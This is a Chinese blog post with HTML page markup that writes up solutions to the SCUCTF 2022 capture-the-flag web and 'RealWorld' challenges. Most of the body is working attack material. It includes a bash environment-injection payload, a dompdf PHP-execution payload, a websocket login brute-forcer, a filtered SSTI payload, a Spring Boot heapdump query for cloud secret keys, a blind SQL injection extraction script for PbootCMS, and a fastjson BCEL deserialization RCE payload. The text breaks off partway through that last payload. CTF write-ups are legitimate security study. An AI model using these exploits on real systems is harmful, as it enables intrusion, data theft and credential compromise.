<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="难得重新开始打比赛，从校赛开始复健练习   简简单单记录下  Webcheckin赛题源码 12345678910111213141516171819202122&lt;?phperror_reporting(0);$action &#x3D; $_GET[&amp;#x27;a&amp;#x27;]?$_GET[&amp;#x27;a&amp;#x27;]:highlight_file(__FILE__);if($action&#x3D;&#x3D;&#x3D;&amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="NS - SCUCTF 2022">
<meta property="og:url" content="http://w1mps.github.io/2022/05/23/SCUCTF2022/index.html">
<meta property="og:site_name" content="Trashbox 4 outx!">
<meta property="og:description" content="难得重新开始打比赛，从校赛开始复健练习   简简单单记录下  Webcheckin赛题源码 12345678910111213141516171819202122&lt;?phperror_reporting(0);$action &#x3D; $_GET[&amp;#x27;a&amp;#x27;]?$_GET[&amp;#x27;a&amp;#x27;]:highlight_file(__FILE__);if($action&#x3D;&#x3D;&#x3D;&amp;">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-05-23T02:39:40.000Z">
<meta property="article:modified_time" content="2022-05-23T09:14:50.337Z">
<meta property="article:author" content="outx">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>NS - SCUCTF 2022</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/paper/">Paper</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post " href="/2022/05/26/Practical%20Automated%20Detection%20of%20Malicious%20npm%20Packages/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post " href="/2022/05/23/DFJK2022/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2022/05/23/SCUCTF2022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&text=NS - SCUCTF 2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&title=NS - SCUCTF 2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&is_video=false&description=NS - SCUCTF 2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=NS - SCUCTF 2022&body=Check out this article: http://w1mps.github.io/2022/05/23/SCUCTF2022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&title=NS - SCUCTF 2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&title=NS - SCUCTF 2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&title=NS - SCUCTF 2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&title=NS - SCUCTF 2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&name=NS - SCUCTF 2022&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2022/05/23/SCUCTF2022/&t=NS - SCUCTF 2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">1.1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#export2html"><span class="toc-number">1.2.</span> <span class="toc-text">export2html</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#anya"><span class="toc-number">1.3.</span> <span class="toc-text">anya</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RealWorld"><span class="toc-number">2.</span> <span class="toc-text">RealWorld</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SignIn"><span class="toc-number">2.1.</span> <span class="toc-text">SignIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Make-nday-great-again-and-again"><span class="toc-number">2.2.</span> <span class="toc-text">Make nday great again and again</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezCMS"><span class="toc-number">2.3.</span> <span class="toc-text">ezCMS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson"><span class="toc-number">2.4.</span> <span class="toc-text">fastjson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FInalUnser"><span class="toc-number">2.5.</span> <span class="toc-text">FInalUnser</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        NS - SCUCTF 2022
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">outx</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-05-23T02:39:40.000Z" itemprop="datePublished">2022-05-23</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Notes/">Notes</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Web/" rel="tag">Web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <blockquote>
<p>难得重新开始打比赛，从校赛开始复健练习</p>
</blockquote>
<blockquote>
<p>简简单单记录下</p>
</blockquote>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>赛题源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]:highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>===<span class="string">&#x27;inject&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Permission denied&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$lock</span> = call_user_func((<span class="variable">$_GET</span>[<span class="string">&#x27;Y&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>]) &amp;&amp; <span class="variable">$lock</span> == <span class="string">&quot;Web_Dog&quot;</span> &amp;&amp; <span class="variable">$action</span> == <span class="string">&#x27;inject&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        putenv(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>=<span class="subst">&#123;$v&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;snakin&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        putenv(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一个action不填留空就行，第二个参数需要fuzz一下得到phpinfo可以过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">funcs = [<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> func in funcs:</span><br><span class="line">    resp = requests.get(url=<span class="string">&quot;http://localhost:8888/222.php?a=inject1&amp;Y=&quot;</span>+func)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;11111&quot;</span> in resp.text:</span><br><span class="line">        <span class="keyword">print</span>(func)</span><br></pre></td></tr></table></figure>

<p>第三个参数按<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">P神的博客</a>来学习下，本地测试成功，远程失败了，但flag在phpinfo里</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bash 4.4及以上： env[BASH_FUNC_snakin%25%25]=() &#123; id; &#125;</span><br><span class="line">Bash 4.4以前：env[BASH_FUNC_snakin()]=() &#123; id; &#125;</span><br><span class="line">需注意&#123;&#125;周围的空格是必不可少的</span><br></pre></td></tr></table></figure>

<h2 id="export2html"><a href="#export2html" class="headerlink" title="export2html"></a>export2html</h2><p>URL输入html生成pdf，看了下是php的，联想到dompdf。这里不是考的rce，而是另一个参数，见<a target="_blank" rel="noopener" href="https://ghostasky.github.io/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/">博文</a></p>
<p>payload: <code> &lt;script%20type=&quot;text/php&quot;&gt;system(&quot;cat%20/flag%20&gt;%20./flaaaaaa.txt&quot;);&lt;/script&gt;</code></p>
<h2 id="anya"><a href="#anya" class="headerlink" title="anya"></a>anya</h2><p>ws暴破登录，密码221，脚本可以参考</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello</span>(<span class="params">pass1</span>):</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(<span class="string">&quot;ws://*.*.*.*:23333/internal/ws&quot;</span>) <span class="keyword">as</span> websocket:</span><br><span class="line">        <span class="keyword">await</span> websocket.send(<span class="string">&quot;begin&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="keyword">await</span> websocket.send(<span class="string">&quot;user admin&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(<span class="string">&quot;pass &quot;</span>+pass1)</span><br><span class="line">        res = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;badpass&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span>(pass1,res)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="built_in">print</span>(pass1 + <span class="string">&quot;error &quot;</span>)</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">220</span>,<span class="number">100000</span>):</span><br><span class="line">        <span class="keyword">await</span> hello(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>

<p>就是效率比较低得分段一起看看，后续研究下ws再来优化</p>
<p>登录后，SSTI，过滤了很多</p>
<p>payload: <code> &#123;&#123;get_flashed_messages[%22__globAls__%22.lower()][%22__buIltins__%22.lower()].__import__(%22os%22)[%22eNviron%22.lower()]&#125;&#125;</code></p>
<h1 id="RealWorld"><a href="#RealWorld" class="headerlink" title="RealWorld"></a>RealWorld</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>/env信息泄漏</p>
<p>参考<a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit%EF%BC%8C%E8%8E%B7%E5%8F%96%E5%85%B6%E4%B8%AD%E7%9A%84SecretKey%EF%BC%8C%E4%B8%8B%E8%BD%BD/heapdump%EF%BC%8C%E6%89%A7%E8%A1%8COQL%E8%AF%AD%E5%8F%A5">https://github.com/LandGrey/SpringBootVulExploit，获取其中的SecretKey，下载/heapdump，执行OQL语句</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;SecretKey&quot;))</span><br></pre></td></tr></table></figure>

<p>拿到SecretKey和SecretId登录tx oss，获取flag</p>
<h2 id="Make-nday-great-again-and-again"><a href="#Make-nday-great-again-and-again" class="headerlink" title="Make nday great again and again"></a>Make nday great again and again</h2><p>第一步，利用前台注入拿CFG_COOKIE_ENCODE</p>
<p>第二步，跟着<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232823">文章</a>打到进后台</p>
<p>第三步，把配置文件中的DATA_CACHE_PREFIX打回来，计算前缀，Getshell</p>
<p>前缀计算代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$path</span> == DATA_PATH) &#123; <span class="variable">$pre</span> = hash(<span class="string">&#x27;md4&#x27;</span>, <span class="string">&#x27;F17&#x27;</span> . C(<span class="string">&#x27;DATA_CACHE_PREFIX&#x27;</span>)) . <span class="string">&#x27;_&#x27;</span>; <span class="variable">$filename</span> = <span class="variable">$path</span> . <span class="variable">$pre</span> . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>; &#125; </span><br></pre></td></tr></table></figure>

<h2 id="ezCMS"><a href="#ezCMS" class="headerlink" title="ezCMS"></a>ezCMS</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考https://gitcode.net/mirrors/mr-xn/Penetration_Testing_POC/-/blob/0392d19e857410ce03fe1979eaaa9843b2022a3a/books/PbootCMS%203.0.4%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.pdf</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://*.*.*.*:23333/index.php?p=search&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http://&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetchName</span>(<span class="params">mode</span>):</span></span><br><span class="line">    char_dic = string.ascii_lowercase+string.digits+<span class="string">&quot;&#125;&#123;-_$&quot;</span></span><br><span class="line">    <span class="comment"># 617925=ay%, 5e=^</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;tab&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&quot;SELECT DISTINCT 1 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 0x70626f6f74636d73 AND TABLE_NAME NOT LIKE 0x617925 AND TABLE_NAME REGEXP 0x5e&quot;</span> </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;col&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&quot;SELECT DISTINCT 1 FROM information_schema.COLUMNS WHERE TABLE_NAME LIKE 0x666c6167677a7a61 AND COLUMN_NAME REGEXP 0x5e&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;flag&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&quot;SELECT DISTINCT 1 FROM flaggzza WHERE flag REGEXP 0x5e736375&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> alpha <span class="keyword">in</span> char_dic:</span><br><span class="line">            <span class="comment"># for none to fetch</span></span><br><span class="line">            <span class="keyword">if</span> alpha == <span class="string">&quot;$&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> name</span><br><span class="line">            hex_s = binascii.b2a_hex(<span class="built_in">bytes</span>(alpha.encode(<span class="string">&#x27;utf-8&#x27;</span>))).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            tmp_p = payload + hex_s</span><br><span class="line">            data = &#123;<span class="string">&#x27;1&#x27;</span>: tmp_p&#125;</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">            resp = requests.post(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;未搜索到任何&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                payload += hex_s</span><br><span class="line">                name += alpha</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># time.sleep(0.5)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;table: &quot;+fetchName(&quot;tab&quot;)) # flaggzza</span></span><br><span class="line"><span class="comment"># print(&quot;column: &quot;+fetchName(&quot;col&quot;)) # flag</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span>+fetchName(<span class="string">&quot;flag&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">BCELEncode.java</span><br><span class="line">/*</span><br><span class="line"> * javac -encoding GBK -g -XDignore.symbol.file BCELEncode.java</span><br><span class="line"> * java BCELEncode EvilCode.class</span><br><span class="line"> */</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line">public class BCELEncode</span><br><span class="line">&#123;</span><br><span class="line">    public static void main ( String[] argv ) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        String  filename    = argv[0];</span><br><span class="line">        byte[]  buf         = Files.readAllBytes( ( new File( filename ) ).toPath() );</span><br><span class="line">        /*</span><br><span class="line">         * public static String encode(byte[] bytes, boolean compress)</span><br><span class="line">         */</span><br><span class="line">        String  str         = Utility.encode( buf, true );</span><br><span class="line">        String  bcel        = &quot;$$BCEL$$&quot; + str;</span><br><span class="line">        System.out.println( bcel );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SpringEcho.java </span><br><span class="line">参考https://github.com/depycode/fastjson-local-echo</span><br><span class="line"></span><br><span class="line">大概长这样， BCEL替换下就行</span><br><span class="line">Payload:&#123;&#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;a&quot;:&#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;:&#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7